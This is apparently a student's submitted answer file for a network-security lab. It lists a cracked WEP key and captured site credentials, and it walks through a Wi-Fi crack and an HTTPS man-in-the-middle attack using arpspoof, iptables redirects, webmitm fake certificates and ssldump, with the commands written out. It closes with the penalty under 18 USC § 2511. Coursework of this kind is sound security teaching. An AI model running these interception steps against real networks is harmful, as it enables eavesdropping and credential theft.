@@ -1,0 +1,30 @@
+﻿(1) The WEP key for the network
+13377C8A6B
+
+
+(2) The password for the HTTPS site the client loads
+username: project3
+password: un5ueSSab1e
+
+
+(3) A paragraph describing the steps and the tools you used to carry out the attacks
+To find the WEP key for the network, we booted Kali Linux, put our wireless card into monitor mode, and used Fern Wifi Cracker to crack the key. To find the username and password for the site the target connects to, we used the following steps:
+        1) Enabled packet forwarding
+                sudo -s
+echo 1 > /proc/sys/net/ipv4/ip_forward
+2) Set up the iptables on our kali linux to accept incoming, forwarded ssl connections
+                iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT
+iptables -A FORWARD -j ACCEPT
+        3) Spoofed the posting computer to see us as the router, so that we would receive all of
+its connections
+                arpspoof -i wlan1 -t 192.168.1.139 192.168.1.1
+        4) Then, we used webmitm to generate and respond with a fake certificate to the posting
+computer’s requests
+                webmitm -d
+        5) Lastly, we used ssldump to log all of the incoming connection data
+                ssldump -i wlan1 -n -d -k webmitm.crt | tee ssldump.log
+The username and password were logged by the webmitm application when the user posted them.
+
+
+(4) The maximum jail time you could face under 18 USC § 2511 for intercepting trafﬁc on an encrypted WiFi network without permission
+5 years
